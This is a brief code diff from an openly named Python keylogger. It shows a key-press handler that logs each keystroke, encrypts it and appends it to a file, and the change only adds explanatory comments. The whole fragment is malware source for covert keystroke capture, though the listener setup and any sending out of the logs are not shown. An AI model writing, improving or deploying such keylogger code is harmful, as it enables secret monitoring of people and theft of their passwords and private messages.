@@ -9,10 +9,10 @@ def on_press(key, active):
     if not active["value"]:
         return
     try:
-        os.makedirs(os.path.dirname(log_path), exist_ok=True)
+        os.makedirs(os.path.dirname(log_path), exist_ok=True)  # Ensure dir exists
         with open(log_path, "ab") as f:
-            key_str = str(key).replace("'", "") + " "
-            f.write(encrypt_data(key_str.encode()))
+            key_str = str(key).replace("'", "") + " "  # Format key
+            f.write(encrypt_data(key_str.encode()))  # Encrypt and write
     except Exception as e:
         print("[!] Keylogger error:", e)
 
